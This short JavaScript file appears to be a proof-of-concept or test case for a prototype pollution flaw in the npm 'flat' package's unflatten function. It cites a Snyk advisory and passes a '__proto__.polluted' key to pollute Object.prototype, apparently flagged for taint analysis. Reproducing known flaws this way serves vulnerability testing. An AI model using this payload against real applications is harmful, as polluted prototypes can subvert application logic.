//https://snyk.io/vuln/SNYK-JS-FLAT-596927
 
  var unflatten = require("flat").unflatten;

   
  unflatten.__x_toTaint = true;
  unflatten({
    "__proto__.polluted": "yes",
  });
// End of file
